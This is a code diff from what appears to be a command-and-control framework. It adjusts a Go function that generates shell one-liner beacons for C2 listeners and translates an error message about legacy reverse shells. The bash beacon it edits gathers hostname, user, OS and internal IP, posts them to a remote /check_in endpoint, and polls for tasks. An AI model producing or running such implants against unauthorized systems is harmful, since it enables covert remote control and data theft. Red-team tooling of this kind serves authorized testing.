@@ -93,7 +93,7 @@ func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKin
 			_ = json.Unmarshal([]byte(listener.ConfigJSON), cfg)
 		}
 		if !cfg.AllowLegacyShell {
-			return fmt.Errorf("监听器未开启 allow_legacy_shell：tcp_reverse 默认仅接受 CSB1 加密 Beacon（AES-GCM + Token）；请用 build 生成 beacon，或显式开启 allow_legacy_shell（公网不推荐）")
+			return fmt.Errorf("allow_legacy_shell is disabled: tcp_reverse accepts CSB1 encrypted beacons (AES-GCM + token) by default. Generate a beacon with build, or explicitly enable allow_legacy_shell (not recommended on public networks).")
 		}
 	}
 	return nil
@@ -106,8 +106,8 @@ func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKin
 //   - 同时返回执行示例，便于 AI 在对话里直接展示给操作员。
 func GenerateOneliner(in OnelinerInput) (string, error) {
 	host := strings.TrimSpace(in.Host)
-	if host == "" {
-		return "", fmt.Errorf("host is required")
+	if err := ValidateBeaconDialHost(host); err != nil {
+		return "", err
 	}
 	switch in.Kind {
 	case OnelinerBash:
@@ -188,13 +188,13 @@ func GenerateOneliner(in OnelinerInput) (string, error) {
 				`OS=$(uname -s 2>/dev/null||echo unknown);`+
 				`AR=$(uname -m 2>/dev/null||echo unknown);`+
 				`IP=$(hostname -I 2>/dev/null|awk "{print \$1}"||echo "");`+
-				`SID="";`+
+				`ST=$(od -An -N32 -tx1 /dev/urandom|tr -d " \n");[ ${#ST} -eq 64 ]||exit 1;SH="X-Session-Token: $ST";SID="";`+
 				`while :;do `+
 				`BODY="{\"hostname\":\"$HN\",\"username\":\"$UN\",\"os\":\"$OS\",\"arch\":\"$AR\",\"internal_ip\":\"$IP\",\"pid\":$$}";`+
-				`R=$(curl -fsSk -H "$H" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
+				`R=$(curl -fsSk -H "$H" -H "$SH" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
 				`if [ -n "$R" ]&&[ -z "$SID" ];then SID=$(echo "$R"|grep -o "\"session_id\":\"[^\"]*\""|head -1|cut -d"\"" -f4);fi;`+
 				`if [ -n "$SID" ];then `+
-				`T=$(curl -fsSk -H "$H" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
+				`T=$(curl -fsSk -H "$H" -H "$SH" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
 				`fi;`+
 				`sleep 5;`+
 				`done' &`,
